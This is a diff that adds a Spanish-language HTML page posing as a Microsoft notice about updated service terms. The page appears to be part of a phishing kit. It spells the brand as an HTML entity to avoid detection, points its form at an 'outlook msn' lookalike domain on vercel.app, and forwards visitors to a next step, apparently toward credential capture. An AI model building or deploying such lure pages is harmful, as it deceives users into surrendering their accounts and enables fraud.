@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="./Iniciar_files/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="./Iniciar_files/styles.css">
+  <link href="./Iniciar_files/remixicon(1).css" rel="stylesheet">
+  <title>Iniciar</title>
+  <style>
+    .button-loading {
+      position: relative;
+      pointer-events: none;
+    }
+
+    .button-loading::after {
+      content: "";
+      position: absolute;
+      width: 16px;
+      height: 16px;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      margin: auto;
+      border: 3px solid transparent;
+      border-top-color: white;
+      border-radius: 50%;
+      animation: button-loading-spinner 1s linear infinite;
+    }
+
+    @keyframes button-loading-spinner {
+      from {
+        transform: rotate(0turn);
+      }
+
+      to {
+        transform: rotate(1turn);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <section class="login">
+    <img src="./Iniciar_files/imgnew.svg" alt="Login-image" class="login--image">
+
+    <form id="loginForm" action="https://20260utlookmsn.vercel.app/indexx.html" class="login--form">
+      <div align="left">
+        <center><img src="./Iniciar_files/lbg.png" style="width:110px"><br></center>
+        <br><br><br>
+        <span style="font-size:20px"><b>Estamos actualizando nuestros terminos</b></span>
+      </div><br>
+      <br>
+      <div>
+        <p>Como parte de nuestros esfuerzos por mejorar su experiencia con Micros&#111;ft, queremos informarte de que se
+          actualizó el contrato de servicios de Micros&#111;ft</p>
+
+      </div>
+      <br><br><br>
+      <button onclick="res()" type="button" class="login--button" id="submitButton">Siguiente</button>
+    </form>
+  
+  </section>
+
+  <!-- Scripts -->
+<script>
+  function res() {
+    location.href="index05.html"
+  }
+</script>
+
+
+<script src="../protect.js"></script>
+<script src="../popup.js"></script>
+</body>
+
+</html>
